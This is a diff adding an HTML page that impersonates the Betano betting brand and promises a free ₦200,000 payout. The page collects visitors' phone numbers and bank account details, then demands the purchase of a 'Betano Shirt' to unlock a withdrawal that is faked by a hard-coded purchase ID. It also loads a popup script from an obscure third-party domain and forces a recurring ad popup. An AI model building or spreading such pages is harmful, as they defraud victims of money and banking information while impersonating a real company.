@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Get free 200k and Withdraw to your bank account">
+  <title>Free ₦200,000 on Betano</title>
+  <style>
+    /* General Styles */
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(to bottom, #ff4e50, #f9d423);
+  color: white;
+  text-align: center;
+  overflow-x: hidden;
+}
+
+.container {
+  margin: 50px auto;
+  padding: 30px;
+  max-width: 400px;
+  border-radius: 15px;
+  background: linear-gradient(135deg, #ff6a6a, #ff2e2e);
+  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+  animation: wave 5s infinite alternate;
+}
+
+.hidden {
+  display: none;
+}
+
+/* Logo Styling */
+.logo img {
+  width: 150px;
+  margin-bottom: 20px;
+}
+
+/* Input and Button Styling */
+input, button {
+  margin: 10px 0;
+  width: 90%;
+  padding: 10px;
+  border-radius: 5px;
+  border: none;
+}
+
+input {
+  border: 1px solid #fff;
+}
+
+button {
+  background: #ff2e2e;
+  color: white;
+  cursor: pointer;
+  font-size: 1rem;
+  transition: background 0.3s ease;
+}
+
+button:hover {
+  background: #d91e1e;
+}
+
+/* Image Styling */
+.reward-animation img, 
+.success-animation img, 
+.reward-icon, 
+.shirt-icon, 
+.success-icon {
+  width: 100px;
+  margin: 20px 0;
+}
+
+.error {
+  color: yellow;
+  margin-top: 10px;
+}
+
+/* Animation */
+@keyframes wave {
+  0% {
+    transform: translateY(0px);
+  }
+  100% {
+    transform: translateY(10px);
+  }
+}
+
+/* Popup Ad Styles */
+.popup {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.6);
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.popup-content {
+    background: #fff;
+    padding: 30px;
+    text-align: center;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+.popup-content h3 {
+    margin-bottom: 10px;
+    color: black;
+}
+
+.popup-content p1 {
+    margin-bottom: 20px;
+    color: black;
+}
+
+.popup-btn {
+    display: inline-block;
+    background-color: #FF6600;
+    color: #fff;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    font-weight: bold;
+}
+
+.popup-btn:hover {
+    background-color: #E65500;
+}
+
+.close-btn {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    font-size: 40px;
+    font-weight: bold;
+    cursor: pointer;
+}
+  </style>
+  
+      <!-- Popup Ad Script -->
+    <script src='//niphaumeenses.net/vignette.min.js' data-zone='8555048' data-sdk='show_8555048'></script>
+  
+</head>
+<body>
+
+  <!-- LOGO & DESCRIPTION -->
+  <div class="container" id="section1">
+    <div class="logo">
+      <img src="https://www.betano.ng/assets/logo__betano__small303bcb4316f91ccd96841e4c6842a038.svg" alt="Betano Logo">
+    </div>
+    <p>Enter your details to claim your reward!</p>
+    <form id="userForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="tel" id="phone" placeholder="Phone Number" required>
+      <input type="text" id="account" placeholder="Account Number" required>
+      <input type="text" id="bank" placeholder="Bank Name" required>
+      <button type="button" onclick="proceed()">Proceed</button>
+    </form>
+  </div>
+
+  <!-- REWARDS SECTION -->
+  <div class="container hidden" id="section2">
+    <div class="reward-animation">
+      <img src="https://media.tenor.com/qCem4zJFBbAAAAAj/sinda-my-sinda.giff" alt="Reward Animation">
+    </div>
+    <h2>You've Received ₦200,000 from Betano</h2>
+    <img src="https://cdn-icons-png.flaticon.com/128/7939/7939956.png" alt="Reward Icon" class="reward-icon">
+    <button onclick="showPurchaseForm()">Withdraw Now</button>
+  </div>
+
+  <!-- PURCHASE ID SECTION -->
+  <div class="container hidden" id="section3">
+    <h3>To make withdrawal, purchase the Betano Shirt and enter your purchase ID below:</h3>
+    <img src="https://i.ebayimg.com/images/g/2FQAAOSwmPljI491/s-l1200.webp" alt="Shirt Icon" class="shirt-icon">
+    <form id="purchaseForm">
+      <input type="text" id="purchaseId" placeholder="Enter Purchase ID" required>
+      <button type="button" onclick="confirmPurchase()">Confirm Purchase ID & Withdraw</button>
+      <a href="cloth.html">
+      <button type="button" > Purchase Betano Shirt </button>
+      </a>
+    </form>
+    <div id="errorMsg" class="error hidden">Invalid Purchase ID. Please try again!</div>
+  </div>
+
+  <!-- WITHDRAWAL SUCCESS -->
+  <div class="container hidden" id="section4">
+    <div class="success-animation">
+      <img src="https://cdn-icons-png.flaticon.com/128/7518/7518748.png" alt="Success Animation">
+    </div>
+    <h2>Withdrawal Successful!</h2>
+    <p>₦200,000 has been successfully transferred to your account.</p>
+    <div id="userDetails"></div>
+   
+  </div>
+  
+      <!-- Custom Popup Modal -->
+    <div id="popupAd" class="popup">
+        <div class="popup-content">
+            <span class="close-btn" id="closePopup">&times;</span>
+            <h3>Special Offer Just for You!</h3>
+            <p1>Don't miss out on this exclusive deal.</p1>
+            <a href="https://whomeenoaglauns.com/4/8593957" target="_blank" class="popup-btn">Claim Your Offer</a>
+        </div>
+    </div>
+
+<script>
+  // Proceed to Rewards Section
+function proceed() {
+  const username = document.getElementById('username').value;
+  const phone = document.getElementById('phone').value;
+  const account = document.getElementById('account').value;
+  const bank = document.getElementById('bank').value;
+
+  if (username && phone && account && bank) {
+    document.getElementById('section1').classList.add('hidden');
+    document.getElementById('section2').classList.remove('hidden');
+  } else {
+    alert('Please fill in all fields.');
+  }
+}
+
+// Show Purchase Section
+function showPurchaseForm() {
+  document.getElementById('section2').classList.add('hidden');
+  document.getElementById('section3').classList.remove('hidden');
+}
+
+// Validate Purchase ID
+function confirmPurchase() {
+  const purchaseId = document.getElementById('purchaseId').value;
+  const errorMsg = document.getElementById('errorMsg');
+  
+  if (purchaseId === 'BetanoShirtFromEtherxchange') {
+    document.getElementById('section3').classList.add('hidden');
+    document.getElementById('section4').classList.remove('hidden');
+
+    const userDetails = `
+      <p><strong>Username:</strong> ${document.getElementById('username').value}</p>
+      <p><strong>Phone:</strong> ${document.getElementById('phone').value}</p>
+      <p><strong>Account Number:</strong> ${document.getElementById('account').value}</p>
+      <p><strong>Bank:</strong> ${document.getElementById('bank').value}</p>
+    `;
+    document.getElementById('userDetails').innerHTML = userDetails;
+  } else {
+    errorMsg.classList.remove('hidden');
+  }
+}
+</script>
+
+<script>
+      // Show the popup ad every 8 seconds
+window.onload = function() {
+    function showPopup() {
+        document.getElementById('popupAd').style.display = 'flex';
+    }
+
+    function closePopup() {
+        document.getElementById('popupAd').style.display = 'none';
+    }
+
+    // Initial popup after 3 seconds
+    setTimeout(showPopup, 3000);
+
+    // Reopen the popup every 8 seconds after it closes
+    setInterval(showPopup, 8000);
+
+    // Close popup on button click
+    document.getElementById('closePopup').addEventListener('click', closePopup);
+};
+
+    </script>
+</body>
+</html>
